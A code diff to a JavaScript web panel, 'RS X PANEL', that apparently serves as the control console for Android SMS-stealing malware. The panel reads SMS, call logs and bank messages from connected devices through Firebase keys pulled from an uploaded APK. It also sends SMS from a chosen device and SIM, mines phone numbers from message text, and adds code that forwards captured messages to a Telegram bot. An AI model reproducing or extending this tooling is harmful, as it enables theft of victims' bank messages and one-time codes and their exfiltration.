+                        <svg width="12" height="12"><use href="#icon-forward"/></svg> Forward TG
+                    </button>
+                </div>` : ''}
+            </div>
+        `;
+    }).join('');
+
+    // Attach forward handlers
+    callList.querySelectorAll('[data-action="forward-call"]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const key = btn.dataset.key;
+            const devId = btn.dataset.device;
+            const call = callCache[devId].find(c => c.key === key);
+            if (call) forwardToTelegram(devId, 'call', call);
+        });
+    });
+}
+
+// NEW: Forward SMS/Call to Telegram via Bot API
+async function forwardToTelegram(deviceId, type, data) {
+    const cfg = getBotConfig(deviceId);
+    if (!cfg.token || !cfg.chatId) {
+        toast('Telegram not configured for this device', 'error');
+        return;
+    }
+
+    const device = allDevices.find(d => d.id === deviceId);
+    const deviceName = device ? (device.deviceName || device.name || deviceId) : deviceId;
+
+    let text = '';
+    if (type === 'sms') {
+        text = `📱 <b>${esc(deviceName)}</b>\n\n`;
+        text += `📨 <b>SMS Forward</b>\n`;
+        text += `From: <code>${esc(data.sender || 'Unknown')}</code>\n`;
+        text += `Time: ${esc(data.dateTime || '')}\n\n`;
+        text += `<pre>${esc(data.message)}</pre>`;
+    } else {
+        text = `📱 <b>${esc(deviceName)}</b>\n\n`;
+        text += `📞 <b>Call Forward</b>\n`;
+        text += `Number: <code>${esc(data.number || 'Unknown')}</code>\n`;
+        text += `Type: ${esc(data.type || 'unknown').toUpperCase()}\n`;
+        text += `Duration: ${esc(data.duration || '-')}\n`;
+        text += `Time: ${esc(data.dateTime || '')}`;
+    }
+
+    try {
+        const url = `https://api.telegram.org/bot${cfg.token}/sendMessage`;
+        const res = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: cfg.chatId,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+        const result = await res.json();
+        if (result.ok) {
+            toast('Forwarded to Telegram', 'success');
+        } else {
+            toast('TG Error: ' + result.description, 'error');
+        }
+    } catch(e) {
+        toast('Forward failed: ' + e.message, 'error');
+    }
+}
+
+function renderNumbersTab(deviceId) {
+    const msgs = messageCache[deviceId] || [];
+    const numberMap = {};
+    let mainNumber = null;
+
+    for (const m of msgs) {
+        const matches = m.message.match(/(\+91|0)?[6-9]\d{9}/g);
+        if (matches) {
+            for (const num of matches) {
+                const clean = num.replace(/^0/, '').replace(/^\+91/, '');
+                numberMap[clean] = (numberMap[clean] || 0) + 1;
+            }
+        }
+        const text = m.message.toLowerCase();
+        if (text.includes('plan expire') || text.includes('plan expired') || text.includes('main number') ||
+            text.includes('mob no') || text.includes('phone no')) {
+            const match = m.message.match(/(\+91|0)?[6-9]\d{9}/);
+            if (match) mainNumber = match[0].replace(/^0/, '').replace(/^\+91/, '');
+        }
+    }
+
+    const sortedNumbers = Object.entries(numberMap).sort((a, b) => b[1] - a[1]);
+    if (!sortedNumbers.length && !mainNumber) {
+        numbersContainer.innerHTML = '<div style="color:var(--muted);padding:12px">No numbers found in SMS.</div>';
+        return;
+    }
+
+    let html = '';
+    if (mainNumber) {
+        html += `
+            <div class="number-main">
+                <div class="nm-label">Main Number (Auto-Detected)</div>
+                <div class="nm-number">+91 ${esc(mainNumber)}</div>
+            </div>
+        `;
+    }
+    html += '<div class="number-list">';
+    for (const [num, count] of sortedNumbers) {
+        if (mainNumber && num === mainNumber) continue;
+        html += `
+            <div class="number-row">
+                <span class="num">+91 ${esc(num)}</span>
+                <span class="count">${count} mention${count > 1 ? 's' : ''}</span>
+            </div>
+        `;
+    }
+    html += '</div>';
+    numbersContainer.innerHTML = html;
 }
 
 function switchTab(tabId) {
@@ -1477,6 +1918,8 @@ tabBtns.forEach(btn => {
         if (selectedDevice) {
             if (tab === 'bank') renderBankTab(selectedDevice);
             else if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
+            else if (tab === 'calls') renderCallsList(selectedDevice.id);
+            else if (tab === 'numbers') renderNumbersTab(selectedDevice.id);
         }
     });
 });
@@ -1492,7 +1935,7 @@ async function sendSms() {
     if (!to || !body) { toast('Enter number and message', 'error'); return; }
     sendSmsBtn.disabled = true;
     sendResult.className = 'send-result';
-    sendResult.textContent = 'Sending…';
+    sendResult.textContent = 'Sending...';
 
     try {
         const payload = {
@@ -1526,6 +1969,25 @@ async function sendSms() {
     }
 }
 
+async function deleteAllSms() {
+    if (!selectedDevice) { toast('No device selected', 'error'); return; }
+    if (!confirm('Delete ALL SMS for this device from Firebase? This cannot be undone.')) return;
+    try {
+        await fbDelete('messages/' + selectedDevice.id);
+        messageCache[selectedDevice.id] = [];
+        renderSmsList(selectedDevice.id, '');
+        renderBankTab(selectedDevice);
+        renderNumbersTab(selectedDevice.id);
+        $('detailSmsCount').textContent = '0';
+        $('detailBankCount').textContent = '0';
+        $('bankTabBadge').textContent = '0';
+        $('smsTabBadge').textContent = '0';
+        toast('All SMS deleted from Firebase', 'success');
+    } catch(e) {
+        toast('Delete failed: ' + e.message, 'error');
+    }
+}
+
 function startPolling() {
     if (pollTimer) clearInterval(pollTimer);
     pollTimer = setInterval(() => {
@@ -1549,7 +2011,7 @@ function esc(str) {
     return div.innerHTML;
 }
 
-// EVENT BINDING
+// Event Listeners
 $('newConnBtn').addEventListener('click', () => {
     accLabel.value = '';
     accUrl.value = '';
@@ -1557,61 +2019,21 @@ $('newConnBtn').addEventListener('click', () => {
     setupError.classList.add('hidden');
     newAccountModal.classList.add('active');
 });
+
 closeAccount.addEventListener('click', () => newAccountModal.classList.remove('active'));
 cancelAccountBtn.addEventListener('click', () => newAccountModal.classList.remove('active'));
 newAccountModal.addEventListener('click', (e) => {
     if (e.target === newAccountModal) newAccountModal.classList.remove('active');
 });
 
-apkUploadArea.addEventListener('click', () => apkFileInput.click());
-apkFileInput.addEventListener('change', (e) => {
-    const file = e.target.files[0];
-    if (!file) return;
-    const reader = new FileReader();
-    reader.onload = (ev) => {
-        let content = ev.target.result;
-        if (content instanceof ArrayBuffer) {
-            const decoder = new TextDecoder('utf-8', { fatal: false });
-            content = decoder.decode(content);
-        }
-        const urlMatch = content.match(/(https?:\/\/[^\s"']+\.firebaseio\.com)/);
-        const keyMatch = content.match(/AIza[0-9A-Za-z_-]{35}/);
-        if (urlMatch) accUrl.value = urlMatch[1];
-        if (keyMatch) accKey.value = keyMatch[0];
-        if (urlMatch || keyMatch) toast('Extracted from file', 'success');
-        else toast('No Firebase credentials found', 'error');
-    };
-    reader.readAsArrayBuffer(file);
-});
-
 saveAccountBtn.addEventListener('click', () => {
+    const label = accLabel.value.trim();
     const url = accUrl.value.trim();
     const key = accKey.value.trim();
-    if (!url) {
-        setupError.textContent = 'Firebase URL dalna zaroori hai';
-        setupError.classList.remove('hidden');
-        return;
-    }
-    if (!key) {
-        setupError.textContent = 'API Key bhi zaroori hai bhai';
-        setupError.classList.remove('hidden');
-        return;
-    }
-    const dup = CONNECTIONS.find(c => c.url === url);
-    if (dup) {
-        setupError.textContent = '⚠️ Already exists: "' + (dup.label || dup.url) + '"';
-        setupError.classList.remove('hidden');
-        toast('Firebase already exists!', 'error');
-        return;
-    }
-    let label = accLabel.value.trim();
-    if (!label) {
-        try { label = new URL(url).hostname.replace(/\.firebaseio\.com.*/,''); }
-        catch(e) { label = url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,''); }
-    }
-    setupError.classList.add('hidden');
+    if (!url) { setupError.textContent = 'Enter Firebase URL'; setupError.classList.remove('hidden'); return; }
+    if (!url.includes('firebaseio.com')) { setupError.textContent = 'Invalid Firebase URL'; setupError.classList.remove('hidden'); return; }
     const conn = {
-        label: label,
+        label: label || url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,''),
         url: url,
         key: key,
         date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
@@ -1620,12 +2042,38 @@ saveAccountBtn.addEventListener('click', () => {
     localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
     newAccountModal.classList.remove('active');
     renderConnections();
-    toast('Account "' + label + '" saved! Ab Connect kar le.', 'success');
-    updateShareLink();
+    toast('Account saved', 'success');
 });
 
-searchInput.addEventListener('input', () => {
-    searchQuery = searchInput.value;
+apkUploadArea.addEventListener('click', () => apkFileInput.click());
+apkFileInput.addEventListener('change', (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+        const text = ev.target.result;
+        const urlMatch = text.match(/https:\/\/[\w-]+\.firebaseio\.com/);
+        const keyMatch = text.match(/AIza[\w-]{35}/);
+        if (urlMatch) accUrl.value = urlMatch[0];
+        if (keyMatch) accKey.value = keyMatch[0];
+        if (urlMatch || keyMatch) {
+            toast('Extracted from file', 'success');
+        } else {
+            toast('No Firebase data found in file', 'error');
+        }
+    };
+    reader.readAsText(file);
+});
+
+$('logoutBtn').addEventListener('click', () => {
+    activeConn = null;
+    stopPolling();
+    showHome();
+    toast('Logged out', 'success');
+});
+
+searchInput.addEventListener('input', (e) => {
+    searchQuery = e.target.value;
     renderDeviceGrid();
 });
 
@@ -1638,26 +2086,15 @@ document.querySelectorAll('.filter').forEach(btn => {
     });
 });
 
-let sortToggle = false;
 $('sortBtn').addEventListener('click', () => {
-    sortToggle = !sortToggle;
-    sortMode = sortToggle ? 'oldest' : 'newest';
-    $('sortBtn').textContent = (sortToggle ? 'Oldest' : 'Newest') + ' ▼';
+    sortMode = sortMode === 'newest' ? 'oldest' : 'newest';
+    $('sortBtn').textContent = sortMode === 'newest' ? 'Newest' : 'Oldest';
     renderDeviceGrid();
 });
 
 $('refreshBtn').addEventListener('click', () => {
     refreshDevices();
     toast('Refreshing...', 'success');
-});
-
-$('logoutBtn').addEventListener('click', () => {
-    stopPolling();
-    activeConn = null;
-    allDevices = [];
-    dashboardScreen.style.display = 'none';
-    showHome();
-    toast('Disconnected');
 });
 
 closeDetail.addEventListener('click', () => {
@@ -1673,23 +2110,26 @@ detailModal.addEventListener('click', (e) => {
     }
 });
 
-smsSearch.addEventListener('input', () => {
-    if (selectedDevice) renderSmsList(selectedDevice.id, smsSearch.value);
+smsSearch.addEventListener('input', (e) => {
+    if (selectedDevice) renderSmsList(selectedDevice.id, e.target.value);
 });
 
-$('refreshSmsBtn').addEventListener('click', async () => {
+$('refreshSmsBtn').addEventListener('click', () => {
     if (selectedDevice) {
-        await loadMessagesForDevice(selectedDevice.id);
-        renderSmsList(selectedDevice.id, smsSearch.value);
-        renderBankTab(selectedDevice);
-        const bm = getDeviceBankSms(selectedDevice.id);
-        const am = messageCache[selectedDevice.id] || [];
-        $('detailBankCount').textContent = bm.length;
-        $('detailSmsCount').textContent = am.length;
-        $('bankTabBadge').textContent = bm.length;
-        $('smsTabBadge').textContent = am.length;
+        loadMessagesForDevice(selectedDevice.id).then(() => {
+            renderSmsList(selectedDevice.id, smsSearch.value);
+            renderBankTab(selectedDevice);
+            const bm = getDeviceBankSms(selectedDevice.id);
+            const am = messageCache[selectedDevice.id] || [];
+            $('detailBankCount').textContent = bm.length;
+            $('detailSmsCount').textContent = am.length;
+            $('bankTabBadge').textContent = bm.length;
+            $('smsTabBadge').textContent = am.length;
+        });
     }
 });
+
+$('deleteAllSmsBtn').addEventListener('click', deleteAllSms);
 
 sendSmsBtn.addEventListener('click', sendSms);
 
@@ -1702,13 +2142,19 @@ document.querySelectorAll('.sim-toggle button').forEach(btn => {
     });
 });
 
-// INIT
+closeTelegramDeviceModal.addEventListener('click', () => telegramDeviceModal.classList.remove('active'));
+cancelTelegramDeviceBtn.addEventListener('click', () => telegramDeviceModal.classList.remove('active'));
+telegramDeviceModal.addEventListener('click', (e) => {
+    if (e.target === telegramDeviceModal) telegramDeviceModal.classList.remove('active');
+});
+saveTelegramDeviceBtn.addEventListener('click', saveTelegramDeviceConfig);
+
 const loaded = loadFromURL();
 if (!loaded) {
     renderConnections();
 }
 updateShareLink();
-console.log('RS X PANEL v3.3 · No quota errors · Exact bank design · Info rows');
+console.log('RS X PANEL v4.1 loaded - Bot node support');
 </script>
 </body>
 </html>
